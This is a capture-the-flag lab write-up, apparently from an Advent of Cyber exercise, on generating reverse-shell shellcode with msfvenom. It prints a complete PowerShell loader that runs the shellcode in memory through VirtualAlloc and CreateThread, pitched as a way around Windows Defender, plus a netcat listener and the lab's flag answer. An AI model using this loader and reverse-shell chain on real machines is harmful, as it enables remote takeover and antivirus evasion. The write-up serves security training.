# Day 08[Shellcodes]: Shellcodes of the worlds, unite!

## Story :
Glitch was preparing for a conference to showcase his shellcode script to access his home server.But Mayor Malware's Henchmen were waiting too get remote access to his homeserver and get a secret research paper by glitch for the mayor. 

## Learning Objectives : 
- Grasp the fundamentals of writing shellcode
- Generate shellcode for reverse shells
- Executing shellcode with PowerShell

## Abbreviations and Applications :
- [Powershell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.4) : command-line shell in Windows.

## Process Key Steps and Points :
- Shellcode, a malicious code used in exploits like buffer overflow attacks, injects commands into vulnerable systems, often executing arbitrary commands or gaining control over compromised machines. Written in assembly language, it’s delivered through various techniques.

- PowerShell, a powerful scripting language and command-line shell in Windows, enables task automation and configuration management. However, attackers exploit it due to its deep access to system resources and ability to run scripts in memory, evading disk-based detection.

- Windows Defender, a built-in security feature, detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods include obfuscating scripts and reflective injection, where malicious code is loaded directly into memory. We’ll focus on reflective injection in this task.

- The Windows API, a bridge between applications and the operating system, allows programs to interact with essential system functions like memory management, file operations, and networking. It’s crucial for many exploitation techniques and malware manipulation. Common Windows API functions used by malicious actors include VirtualAlloc, CreateThread, and WaitForSingleObject, which we’ll also use in this task.
- Accessing Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, it allows attackers to call Windows API functions directly at runtime, enabling manipulation of low-level system processes and bypassing security mechanisms.

- A reverse shell is a type of connection where the target machine initiates a connection back to the attacker’s machine. 

## Tools and Commands Used :
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell` : Generate powershell shellcode
```powershell
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
- And the `SHELLCODE_PLACEHOLDER` is the output from `msfvenom`.
- `nc -nvlp 1111` : netcat listen on port 1111 with verbose enabled
  
## Questions, Hints and Answers :
1. What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the C:\Users\glitch\Desktop directory. You can view the content of the flag by using the command type C:\Users\glitch\Desktop\flag.txt.
   > ![flagtxt](/Screenshots/D8.png)
   > Ans : `AOC{GOT _MY_ACCESS_B@CK007}`
